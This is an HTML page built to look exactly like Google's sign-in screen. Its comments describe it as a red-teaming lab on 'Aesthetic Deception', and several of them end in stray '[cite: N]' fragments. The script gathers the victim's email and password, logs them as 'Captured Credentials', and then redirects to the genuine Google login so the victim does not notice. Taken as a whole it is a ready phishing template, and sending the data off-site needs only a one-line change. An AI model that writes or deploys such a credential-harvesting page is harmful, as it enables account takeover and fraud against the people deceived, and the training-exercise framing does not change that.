<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        /* Aesthetic Deception - UI/UX Accuracy */
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            width: 360px;
            min-height: 400px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }

        .google-logo {
            width: 75px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 0 0 8px;
        }

        p {
            font-size: 16px;
            color: #202124;
            margin-bottom: 24px;
        }

        /* The Identity Pill[cite: 4] */
        #identity-section {
            display: none; /* Hidden until step 2 */
            align-items: center;
            justify-content: center;
            border: 1px solid #dadce0;
            padding: 3px 10px 3px 5px;
            border-radius: 16px;
            margin: 0 auto 24px;
            width: fit-content;
        }

        #profile-img {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            margin-right: 8px;
        }

        input {
            width: 100%;
            padding: 13px 15px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }

        input:focus {
            outline: none;
            border: 2px solid #1a73e8;
        }

        .footer-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }

        .forgot-link {
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            text-decoration: none;
        }

        button {
            background-color: #1a73e8;
            color: white;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        /* Animations for the 'Silky Smooth' transition */
        .fade {
            transition: opacity 0.2s ease-in-out, transform 0.2s ease-in-out;
        }

        .hidden {
            display: none;
            opacity: 0;
            transform: translateX(20px);
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
    
    <div id="step-1" class="fade">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <input type="email" id="email-input" placeholder="Email or phone" autofocus>
        <div class="footer-actions">
            <a href="#" class="forgot-link">Forgot email?</a>
            <button onclick="toStep2()">Next</button>
        </div>
    </div>

    <div id="step-2" class="fade hidden">
        <h1>Welcome</h1>
        <div id="identity-section">
            <img id="profile-img" src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="">
            <span id="user-email-display" style="font-size: 14px; color: #3c4043;"></span>
        </div>
        <input type="password" id="password-input" placeholder="Enter your password">
        <div class="footer-actions">
            <a href="#" class="forgot-link">Forgot password?</a>
            <button onclick="finish()">Next</button>
        </div>
    </div>
</div>

<script>
    /**
     * LAB_EXERCISES_78.txt - Lab 3.1: Multi-Turn Attack Sequence[cite: 1]
     * Objective: Transition context from benign (email) to target (password).
     */
    function toStep2() {
        const email = document.getElementById('email-input').value;
        if (!email) return alert("Enter an email");

        // Reference Anchoring: Showing the user's data back to them[cite: 4]
        document.getElementById('user-email-display').innerText = email;
        
        const s1 = document.getElementById('step-1');
        const s2 = document.getElementById('step-2');
        const identity = document.getElementById('identity-section');

        s1.style.opacity = '0';
        s1.style.transform = 'translateX(-20px)';

        setTimeout(() => {
            s1.classList.add('hidden');
            s2.classList.remove('hidden');
            identity.style.display = 'flex';
            
            // Force reflow for animation
            setTimeout(() => {
                s2.style.opacity = '1';
                s2.style.transform = 'translateX(0)';
                document.getElementById('password-input').focus();
            }, 10);
        }, 200);
    }

    function finish() {
        const pass = document.getElementById('password-input').value;
        const email = document.getElementById('email-input').value;
        
        // This is where you'd log the data in a real red-teaming exercise[cite: 1]
        console.log("Captured Credentials:", { email, pass });
        
        // Redirect to actual Google to finalize the 'Silky Smooth' illusion[cite: 3]
        window.location.href = "https://accounts.google.com/ServiceLogin";
    }
</script>

</body>
</html>
